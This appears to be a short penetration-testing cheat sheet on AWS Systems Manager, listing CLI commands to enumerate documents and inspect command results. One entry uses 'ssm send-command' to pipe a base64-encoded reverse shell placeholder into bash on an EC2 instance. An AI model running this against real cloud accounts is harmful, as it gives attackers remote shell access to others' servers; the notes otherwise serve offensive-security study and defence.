# Systems Manager (SSM)

SSM provides a centralised platform for configuring, managing, and maintaining servers and applications in your AWS environment.

- `aws ssm list-documents --region <region>`: List documents
- `aws ssm send-command --document-name <name> --instance-ids <ec2_instance_id> --parameters '{"commands": ["echo <base64_revshell> | base64 -d | bash"]}' --output text`: Send reverse shell command to EC2 instance
    - We note the `CommandId`
    - After, we list all commands: `aws ssm list-commands`, and we can see the status of our command (e.g. `Success`)
    - We can see the command output via `aws ssm get-command-invocation --command-id <command-id> --instance-id <instance-id>`
        - Alternatively, we can also run `aws ssm list-command-invocations --command-id <command-id> --instance-id <instance-id> --details`
    